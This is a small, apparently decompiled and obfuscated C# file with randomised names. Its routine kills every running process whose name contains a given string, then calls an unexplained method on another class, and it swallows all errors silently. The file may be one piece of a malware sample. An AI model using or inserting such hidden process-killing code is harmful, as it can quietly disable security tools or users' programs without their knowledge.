using System;
using System.Diagnostics;

namespace FEPAnxLYcpgz;

public sealed class HhovKJRYBvP
{
	public static bool qIrhfzoOCRK(Process process_0, string string_0)
	{
		try
		{
			return process_0.ProcessName.ToLower().Contains(string_0.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void rmdZSrtkIJff(string string_0, string string_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (qIrhfzoOCRK(process, string_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					frAELqEtncDC.rpAtPgFLLjt();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
